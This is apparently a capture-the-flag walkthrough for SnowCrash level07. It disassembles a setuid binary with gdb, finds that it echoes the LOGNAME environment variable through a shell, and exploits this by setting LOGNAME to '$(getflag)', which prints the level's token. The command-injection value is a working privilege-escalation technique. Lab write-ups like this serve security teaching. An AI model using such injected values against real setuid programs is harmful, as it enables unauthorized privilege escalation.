For this level, the "ls -l" command show us an executable.

	level07@SnowCrash:~$ ls -l
	total 12
	-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

	level07@SnowCrash:~$ ./level07
	level07

By executing it, it appear to just print "level07". We need to use gdb to find out what it does.

	   0x0804856f <+91>:	movl   $0x8048680,(%esp)
	   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
	   0x0804857b <+103>:	mov    %eax,0x8(%esp)
	   0x0804857f <+107>:	movl   $0x8048688,0x4(%esp)
	   0x08048587 <+115>:	lea    0x14(%esp),%eax
	   0x0804858b <+119>:	mov    %eax,(%esp)
	   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
	   ...
	   ...
	   ...
	   (gdb) x/s 0x8048680
	   0x8048680:	 "LOGNAME"
	   (gdb) x/s 0x8048688
	   0x8048688:	 "/bin/echo %s "
	   (gdb)

By searching a bit we can find out that the script search for the LOGNAME in the env.
Then it print the string with "/bin/echo %s".

We need to change the LOGNAME in the env to print the flag.

	level07@SnowCrash:~$ export LOGNAME='$(getflag)'
	level07@SnowCrash:~$ ./level07 
	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

